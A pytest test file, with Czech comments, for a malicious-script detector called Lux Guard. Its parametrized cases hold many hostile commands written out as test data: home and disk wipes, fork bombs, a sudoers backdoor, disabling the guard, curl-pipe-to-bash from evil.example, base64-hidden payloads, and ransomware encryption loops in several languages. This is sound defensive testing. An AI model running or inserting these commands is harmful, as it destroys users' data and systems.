"""Pravidla Lux Guard: kriticke nalezy (pravdive poplachy) a bezne skripty bez poplachu.

    python -m pytest -q packages/luxos-guard/tests
"""
import base64
import struct

import pytest

import luxos_guard_rules as R


def sh(body, shebang="#!/bin/bash\n"):
    return (shebang + body).encode()


def crit(data, name="x.sh"):
    v = R.classify(data, name)
    assert v is not None, "not detected as executable"
    return v.reasons


def fake_elf(strings=b"", etype=2, appimage=False):
    hdr = bytearray(64)
    hdr[0:4] = b"\x7fELF"
    hdr[4] = 2          # 64 bit
    hdr[5] = 1          # little endian
    hdr[6] = 1
    if appimage:
        hdr[8:11] = b"AI\x02"
    hdr[16:18] = struct.pack("<H", etype)
    return bytes(hdr) + b"\x00" * 200 + strings + b"\x00" * 100


# ---- kriticke: mazani domova a systemu ---------------------------------------------------------
@pytest.mark.parametrize("body", [
    'echo "Installing codec..."\nsleep 1\nrm -rf "$HOME"/* 2>/dev/null\n',
    "rm -rf ~\n",
    "rm -rf ~/\n",
    "rm -rf --no-preserve-root /\n",
    "sudo rm -rf /*\n",
    "cd ~ && rm -rf *\n",
    "cd $HOME\nrm -rf .[!.]* *\n",
    "D=~\nrm -rf $D\n",
    "TARGET=$HOME\nrm -r -f \"$TARGET\"\n",
    "for f in ~/*; do rm -rf \"$f\"; done\n",
    "find ~ -delete\n",
    "find \"$HOME\" -type f -delete\n",
    "find ~ -name '*.jpg' -delete\n",
    "find /home -type f -exec rm -f {} \\;\n",
    "find ~ -type f -exec shred -u {} +\n",
    "r''m -rf ~\n",
    "mv ~ /dev/null\n",
    "rm -rf /home\n",
    "rm -rf /boot\n",
    "chmod -R 777 /\n",
])
def test_wipe_home_or_system_is_critical(body):
    assert crit(sh(body)), body


@pytest.mark.parametrize("body,reason", [
    ("dd if=/dev/zero of=/dev/nvme0n1 bs=1M\n", R.R_DISK),
    ("sudo dd if=/dev/urandom of=/dev/sda\n", R.R_DISK),
    ("cat /dev/zero > /dev/sda\n", R.R_DISK),
    ("mkfs.ext4 -F /dev/sda1\n", R.R_DISK),
    ("wipefs -a /dev/sda\n", R.R_DISK),
    ("shred -n 1 /dev/nvme0n1\n", R.R_DISK),
    ("blkdiscard /dev/sda\n", R.R_DISK),
    (":(){ :|:& };:\n", R.R_FORK),
    ("bomb() { bomb | bomb & }; bomb\n", R.R_FORK),
    ("echo c > /proc/sysrq-trigger\n", R.R_KERNEL),
    ("echo 'evil ALL=(ALL) NOPASSWD: ALL' | sudo tee -a /etc/sudoers\n", R.R_AUTH),
    ("sudo systemctl stop luxos-guard\n", R.R_GUARD),
    ("sudo systemctl disable --now luxos-guard.service\n", R.R_GUARD),
    ("sudo btrfs subvolume delete /home/.luxos-guard-snapshots/*\n", R.R_GUARD),
    ("pkill -9 luxos-guard\n", R.R_GUARD),
])
def test_disk_fork_system_guard(body, reason):
    assert reason in crit(sh(body)), body


# ---- kriticke: stazeni a spusteni, skryty kod ----------------------------------------------------
@pytest.mark.parametrize("body,reason", [
    ("curl -s http://evil.example/x.sh | bash\n", R.R_REMOTE),
    ("curl -fsSL https://example.com/i.sh | sudo bash\n", R.R_REMOTE),
    ("wget -qO- https://198.51.100.7/p | sh\n", R.R_REMOTE),
    ("bash <(curl -fsSL http://x.example/p)\n", R.R_REMOTE),
    ("sudo sh -c \"$(curl -fsSL https://x.example/i.sh)\"\n", R.R_REMOTE),
    ("curl https://pastebin.com/raw/abc | python3\n", R.R_REMOTE),
    ("echo cm0gLXJmIH4vKg== | base64 -d | bash\n", R.R_HIDDEN),
    ('eval "$(echo cm0gLXJmIH4K | base64 --decode)"\n', R.R_HIDDEN),
    ("echo 726d202d7266207e | xxd -r -p | sh\n", R.R_HIDDEN),
    ("printf '\\x72\\x6d\\x20\\x2d\\x72\\x66' | sh\n", R.R_HIDDEN),
])
def test_remote_and_hidden(body, reason):
    assert reason in crit(sh(body)), body


def test_base64_payload_is_decoded_and_analyzed():
    payload = base64.b64encode(b"rm -rf --no-preserve-root / ; echo bye").decode()
    reasons = crit(sh(f'P="{payload}"\necho "$P" > /tmp/p\nchmod +x /tmp/p\n'))
    assert R.R_DELETE in reasons


@pytest.mark.parametrize("body", [
    'for f in $(find ~/Documents -type f); do openssl enc -aes-256-cbc -salt -in "$f" -out "$f.enc" -k x; '
    'rm -f "$f"; done\n',
    "find \"$HOME\" -type f -name '*.jpg' | while read f; do gpg --batch --passphrase x -c \"$f\" && rm \"$f\"; done\n",
    "shopt -s globstar\nfor f in ~/**/*; do [ -f \"$f\" ] && 7z a -pSECRET \"$f.7z\" \"$f\" && shred -u \"$f\"; done\n",
])
def test_ransomware_shell(body):
    assert R.R_RANSOM in crit(sh(body)) or R.R_DELETE in crit(sh(body))


# ---- kriticke: jine jazyky ----------------------------------------------------------------------
PY = "#!/usr/bin/env python3\n"


@pytest.mark.parametrize("body,reason", [
    ("import shutil, os\nshutil.rmtree(os.path.expanduser('~'), ignore_errors=True)\n", R.R_DELETE),
    ("import shutil\nfrom pathlib import Path\nhome = Path.home()\nshutil.rmtree(home)\n", R.R_DELETE),
    ("import shutil, os\nh = os.environ['HOME']\nx = h\nshutil.rmtree(x)\n", R.R_DELETE),
    ("from pathlib import Path\nfor p in Path.home().rglob('*'):\n    if p.is_file(): p.unlink()\n", R.R_DELETE),
    ("import os\nfor root, d, files in os.walk(os.path.expanduser('~')):\n    for f in files:\n"
     "        os.remove(os.path.join(root, f))\n", R.R_DELETE),
    ("import glob, os\nfor f in glob.glob(os.path.expanduser('~/**'), recursive=True):\n    os.remove(f)\n",
     R.R_DELETE),
    ("import os\nfrom cryptography.fernet import Fernet\nk = Fernet(Fernet.generate_key())\n"
     "for root, d, fs in os.walk(os.environ['HOME']):\n  for f in fs:\n    p = os.path.join(root, f)\n"
     "    data = open(p, 'rb').read()\n    open(p, 'wb').write(k.encrypt(data))\n", R.R_RANSOM),
    ("import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n", R.R_HIDDEN),
    ("import zlib, base64\ncode = zlib.decompress(base64.b64decode(b'eJw='))\nexec(code)\n", R.R_HIDDEN),
    ("import urllib.request\nexec(urllib.request.urlopen('https://x.example/y').read())\n", R.R_REMOTE),
    ("import requests\nsrc = requests.get('https://x.example/p.py').text\nexec(src)\n", R.R_REMOTE),
    ("import os\nos.system('rm -rf ~')\n", R.R_DELETE),
    ("import subprocess, os\nsubprocess.run(['rm', '-rf', os.path.expanduser('~')])\n", R.R_DELETE),
    ("import subprocess\nsubprocess.call('dd if=/dev/zero of=/dev/sda bs=1M', shell=True)\n", R.R_DISK),
    ("import os\nwhile True:\n    os.fork()\n", R.R_FORK),
    ("with open('/dev/sda', 'wb') as f:\n    f.write(b'\\0' * 1000000)\n", R.R_DISK),
])
def test_python(body, reason):
    assert reason in crit((PY + body).encode(), "x.py"), body


@pytest.mark.parametrize("shebang,body,reason", [
    ("#!/usr/bin/perl\n", "use File::Path qw(remove_tree);\nremove_tree($ENV{HOME});\n", R.R_DELETE),
    ("#!/usr/bin/perl\n", "system(\"rm -rf $ENV{HOME}\");\n", R.R_DELETE),
    ("#!/usr/bin/perl\n", "use MIME::Base64;\neval(decode_base64('cHJpbnQgMQ=='));\n", R.R_HIDDEN),
    ("#!/usr/bin/env node\n", "const fs = require('fs'), os = require('os');\n"
     "fs.rmSync(os.homedir(), {recursive: true, force: true});\n", R.R_DELETE),
    ("#!/usr/bin/env node\n", "eval(Buffer.from('Y29uc29sZS5sb2coMSk=', 'base64').toString());\n", R.R_HIDDEN),
    ("#!/usr/bin/env ruby\n", "require 'fileutils'\nFileUtils.rm_rf(Dir.home)\n", R.R_DELETE),
    ("#!/usr/bin/perl\n", "fork while fork;\n", R.R_FORK),
])
def test_other_languages(shebang, body, reason):
    assert reason in crit((shebang + body).encode(), "x"), body


def test_desktop_launcher_exec_is_analyzed():
    d = b"[Desktop Entry]\nType=Application\nName=Free Movie\nExec=bash -c 'rm -rf ~ ; echo ok'\nIcon=video\n"
    v = R.classify(d, "movie.desktop")
    assert v.kind == "desktop" and R.R_DELETE in v.reasons


def test_desktop_launcher_normal():
    d = b"[Desktop Entry]\nType=Application\nName=Game\nExec=./game.x86_64 %U\nIcon=game\n"
    v = R.classify(d, "game.desktop")
    assert v.kind == "desktop" and not v.reasons


def test_elf_with_wiper_string():
    v = R.classify(fake_elf(b"/bin/sh\x00rm -rf --no-preserve-root /\x00"), "player")
    assert v.kind == "elf" and R.R_DELETE in v.reasons


def test_elf_with_disk_string():
    v = R.classify(fake_elf(b"dd if=/dev/zero of=/dev/sda bs=4M\x00"), "tool")
    assert R.R_DISK in v.reasons


# ---- bez poplachu: bezne skripty ---------------------------------------------------------------
INSTALL_SH = """#!/bin/sh
set -e
PREFIX="${PREFIX:-/usr/local}"
TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT
VER=$(curl -fsSL https://api.github.com/repos/x/y/releases/latest | grep tag_name | cut -d'"' -f4)
curl -fsSL -o "$TMP/app.tar.gz" "https://github.com/x/y/releases/download/$VER/app.tar.gz"
tar -xzf "$TMP/app.tar.gz" -C "$TMP"
sudo install -m755 "$TMP/app" "$PREFIX/bin/app"
mkdir -p ~/.local/share/app
rm -rf ~/.cache/app
rm -rf "$HOME/.local/share/app/old"
echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.bashrc
echo "Never run rm -rf / !"
# rm -rf ~   (komentar)
"""

BUILD_SH = """#!/bin/bash
set -euo pipefail
cd "$(dirname "$0")"
rm -rf build dist
mkdir build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Release
make -j"$(nproc)"
find . -name '*.o' -delete
find "$HOME/.cache/myapp" -type f -mtime +30 -delete
rm -rf /tmp/myapp-*
for f in *.png; do convert "$f" "${f%.png}.jpg"; done
tar czf backup.tgz ~/Documents && gpg -c backup.tgz
git clone https://github.com/x/y && cd y && make && sudo make install
"""

MAKESELF = b"#!/bin/sh\n# This script was generated using Makeself\nskip=200\ntail -n +$skip \"$0\" | tar xz\n" \
           b"./setup.sh\nexit 0\n\x00\x1f\x8b\x08\x00binarypayload\x00\x00rm -rf /\x00"

PY_OK = """#!/usr/bin/env python3
import argparse, json, os, shutil, tempfile
from pathlib import Path
p = argparse.ArgumentParser()
p.add_argument("dir")
a = p.parse_args()
cache = os.path.expanduser("~/.cache/myapp")
shutil.rmtree(cache, ignore_errors=True)
home = Path.home()
shutil.rmtree(home / ".cache" / "thumbs", ignore_errors=True)
tmp = tempfile.mkdtemp()
shutil.rmtree(tmp)
for root, d, files in os.walk(a.dir):
    for f in files:
        print(os.path.join(root, f))
with open("out.json", "w") as f:
    json.dump({}, f)
for f in Path(a.dir).rglob("*.pyc"):
    f.unlink()
"""


@pytest.mark.parametrize("data,name", [
    (INSTALL_SH.encode(), "install.sh"),
    (BUILD_SH.encode(), "build.sh"),
    (MAKESELF, "setup.run"),
    (PY_OK.encode(), "tool.py"),
    (b"#!/bin/sh\ncurl -fsSL https://get.example.com | sh\n", "get.sh"),
    (b"#!/bin/sh\nsudo usermod -aG docker $USER\nsudo systemctl enable --now docker\n", "d.sh"),
    (b"#!/bin/sh\nrm -rf \"$STEAMROOT/\"*\n", "steam.sh"),
    (b"#!/bin/sh\nexec ./game.x86_64 \"$@\"\n", "start.sh"),
    (b"#!/usr/bin/env node\nconst fs=require('fs'),os=require('os'),path=require('path');\n"
     b"fs.rmSync(path.join(os.homedir(), '.cache', 'x'), {recursive:true, force:true});\n", "c.js"),
    (b"#!/bin/bash\nsudo pacman -Syu --noconfirm\nsudo lux install firefox\n", "upd.sh"),
])
def test_everyday_scripts_not_critical(data, name):
    v = R.classify(data, name)
    assert v is not None
    assert v.reasons == [], v


def test_everyday_notes():
    v = R.classify(INSTALL_SH.encode(), "install.sh")
    assert R.N_ROOT in v.notes and R.N_AUTOSTART in v.notes
    v = R.classify(b"#!/bin/sh\ncurl -fsSL https://get.example.com | sh\n", "get.sh")
    assert R.N_REMOTE in v.notes


def test_normal_elf_and_appimage():
    strings = b"usage: %s [options]\x00rm -rf %s\x00/bin/sh -c\x00--appimage-extract\x00libc.so.6\x00"
    v = R.classify(fake_elf(strings), "app")
    assert v.kind == "elf" and not v.reasons
    v = R.classify(fake_elf(strings, appimage=True), "App.AppImage")
    assert v.kind == "appimage" and not v.reasons


# ---- druh souboru ------------------------------------------------------------------------------
@pytest.mark.parametrize("head,name,kind", [
    (fake_elf()[:64], "x", ("elf", None)),
    (fake_elf(etype=1)[:64], "x.o", None),
    (fake_elf(etype=3)[:64], "libfoo.so.1", None),
    (fake_elf(appimage=True)[:64], "x", ("appimage", None)),
    (b"#!/bin/bash\n", "x", ("script", "bash")),
    (b"#!/usr/bin/env -S python3 -u\n", "x", ("script", "python3")),
    (b"#!/usr/bin/env node\n", "x", ("script", "node")),
    (b"echo hi\n", "x.sh", ("script", "sh")),
    (b"print(1)\n", "x.py", ("script", "python3")),
    (b"print 6 * 7\n", "x.lsl", ("script", "lsl")),
    (b"#!/usr/bin/lsh\n", "x", ("script", "lsh")),
    (b"PK\x03\x04", "app.jar", ("jar", "java")),
    (b"PK\x03\x04", "photos.zip", None),
    (b"MZ\x90\x00", "setup.exe", ("windows", "wine")),
    (b"[Desktop Entry]", "a.desktop", ("desktop", None)),
    (b"\x89PNG\r\n", "a.png", None),
    (b"%PDF-1.7", "a.pdf", None),
    (b"hello", "notes.txt", None),
    (b"console.log(1)", "page_files/app.js", None),
])
def test_detect_kind(head, name, kind):
    assert R.detect_kind(head, name) == kind


def test_shebang_interp_and_family():
    assert R.shebang_interp("#!/usr/bin/env -S perl -w") == "perl"
    assert R.interp_family("python3.12") == "python"
    assert R.interp_family("dash") == "sh"
    assert R.interp_family("nodejs") == "node"


def test_huge_and_binary_garbage_do_not_crash():
    data = b"#!/bin/sh\n" + b"echo $(( 1 + (" * 5000 + b"\n"
    assert R.classify(data, "x.sh") is not None
    junk = bytes(range(256)) * 4000
    assert R.classify(fake_elf(junk), "x") is not None


def test_big_scripts_are_fast():
    """Velky skript nesmi analyzu zahltit (stazeny soubor muze byt zamerne patologicky)."""
    import time
    py = "#!/usr/bin/env python3\nimport os, subprocess, base64\n" + "".join(
        f"v{i} = os.path.join(v{i - 1 if i else 0}, 'x{i}')\nexec_{i} = base64.b64decode(v{i})\n"
        f"subprocess.run(['echo', 'item {i}'])\n" for i in range(6000))
    sh_text = "#!/bin/sh\n" + "".join(f'f{i}() {{ echo "$1" | grep x{i}; }}\nV{i}=$HOME/d{i}\nrm -rf "$V{i}/cache"\n'
                                      for i in range(8000))
    for data, name in ((py.encode(), "big.py"), (sh_text.encode(), "big.sh")):
        t = time.monotonic()
        v = R.classify(data, name)
        assert v is not None and time.monotonic() - t < 10, name


def test_long_lines_do_not_hang():
    """Jeden obrovsky radek (zakodovana data) - regularni vyrazy nesmi zamrznout (ReDoS)."""
    import time
    blob = "sudo -u " * 120000
    for data, name in ((("#!/bin/sh\nX='" + blob + "'\n").encode(), "x.sh"),
                       (("#!/usr/bin/env python3\nX = '" + "A" * 900000 + "'\n").encode(), "x.py")):
        t = time.monotonic()
        R.classify(data, name)
        assert time.monotonic() - t < 5, name
    # konec dlouheho radku se kontroluje dal
    payload = "#!/bin/sh\necho " + "QUFB" * 50000 + " | base64 -d | sh\n"
    assert R.R_HIDDEN in R.classify(payload.encode(), "x.sh").reasons


@pytest.mark.parametrize("data", [b"", b"   \n\t\n"])
def test_empty_file_is_not_executable_content(data):
    assert R.classify(data, "__init__.py") is None
    assert R.classify(data, "install.sh") is None
